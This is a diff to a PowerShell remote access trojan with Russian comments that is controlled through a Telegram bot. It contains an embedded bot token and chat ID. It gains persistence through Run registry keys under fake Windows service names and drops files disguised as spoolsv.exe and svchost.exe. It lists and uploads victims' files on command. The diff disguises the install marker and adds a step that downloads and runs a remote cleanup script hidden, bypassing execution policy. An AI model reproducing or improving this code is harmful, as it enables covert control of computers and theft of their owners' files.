@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - РАДИКАЛЬНО ИСПРАВЛЕННАЯ ВЕРСИЯ
+# RAT через Telegram Bot - ФИНАЛЬНАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -116,9 +116,8 @@ function Compress-Folder {
     }
 }
 
-# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная перезапись системы установки
-# Уникальная установка в автозагрузку с двойной проверкой
-$installMarker = "$env:TEMP\rat_installed.marker"
+# СИСТЕМА УСТАНОВКИ С МАРКЕРОМ
+$installMarker = "$env:TEMP\system_update_installed.dat"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
@@ -153,7 +152,7 @@ $currentDir = "C:\"
 $global:LastSentMessage = ""
 $global:LastUpdateId = 0
 
-# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная очистка истории сообщений при запуске
+# ПОЛНАЯ ОЧИСТКА ИСТОРИИ СООБЩЕНИЙ ПРИ ЗАПУСКЕ
 try {
     $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
     Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
@@ -166,7 +165,7 @@ Send-Telegram "RAT активирован на $env:COMPUTERNAME
 /ls - список файлов
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл
-/kill - самоуничтожение"
+/selfdestruct - самоуничтожение"
 
 # Основной цикл опроса
 while ($true) {
@@ -189,7 +188,7 @@ while ($true) {
 /ls - список файлов в текущей директории
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл или папку
-/kill - самоуничтожение RAT"
+/selfdestruct - самоуничтожение RAT"
                         }
                         "^/ls$" {
                             $items = Get-ChildItem -Path $currentDir -Force
@@ -249,62 +248,17 @@ $($fileList -join "`n")"
                                 Send-Telegram "Файл/папка не найдены: $target"
                             }
                         }
-                        "^/kill$" {
+                        "^/selfdestruct$" {
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
-                                # Создаем временный скрипт очистки с запасным URL
-                                $cleanupContent = @'
-# Альтернативный cleanup скрипт
-$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
-$ChatID = "5674514050"
-
-function Send-Telegram {
-    param([string]$Message)
-    $url = "https://api.telegram.org/bot$Token/sendMessage"
-    $body = @{chat_id = $ChatID; text = $Message}
-    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null } catch { }
-}
-
-Send-Telegram "🔄 Запуск альтернативной очистки..."
-
-# Удаляем файлы
-$files = @(
-    "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
-    "$env:TEMP\rat_installed.marker",
-    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe"
-)
-
-foreach ($file in $files) {
-    if (Test-Path $file) {
-        try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch { }
-    }
-}
-
-# Очищаем автозагрузку
-$regPaths = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-)
-
-foreach ($regPath in $regPaths) {
-    try {
-        Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
-        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
-    } catch { }
-}
-
-# Очищаем историю RUN
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-
-Send-Telegram "✅ Альтернативная очистка завершена"
-'@
+                                # Загружаем cleanup.ps1 с GitHub
+                                $cleanupScript = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/imsog/system-scanner/refs/heads/main/cleanup.ps1" -UseBasicParsing
                                 
                                 $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
-                                $cleanupContent | Out-File -FilePath $cleanupPath -Encoding UTF8
+                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                 
-                                # Запускаем скрипт очистки
+                                # Запускаем скрипт очистки в отдельном процессе
                                 Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -WindowStyle Hidden
                                 
                                 # Даем время на запуск cleanup
